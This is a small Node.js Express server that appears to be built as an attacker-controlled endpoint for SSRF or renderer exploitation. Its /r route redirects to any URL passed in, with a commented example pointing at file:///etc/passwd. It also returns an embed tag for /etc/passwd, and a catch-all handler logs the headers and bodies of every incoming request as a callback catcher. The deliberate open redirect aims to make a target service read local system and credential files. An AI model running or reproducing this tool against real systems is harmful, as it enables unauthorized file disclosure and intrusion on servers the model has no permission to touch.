//require('newrelic');
// arm
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

const PORT = process.env.PORT || 808;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Redirect via Location header
// /r?r=file:///etc/passwd
app.use('/r', (req, res, next) =>{
    param = req.query['r']
    console.log(req.query);
    res.setHeader('Location', param)
    res.statusCode= 301;
    res.send('<embed src="file://etc/passwd" width="300" height="200">')
    next();
});

app.use((req, res) => {
    const rMethod = req.method;
    const rUrl = req.url;
    const rHeaders = req.headers;
    console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
    console.info(rHeaders);
    console.info('BODY--------------------------------------------------------------\n'+JSON.stringify(req.body));
    res.statusCode = 301;
    // res.setHeader('Location', 'https://srvcb.herokuapp.com/m0.html');
    res.send();
    console.info('END---------------------------------------------------------------\n\n\n');
});

app.listen(PORT, ()=>{
    console.log(`Server is working on ${PORT}`);
});
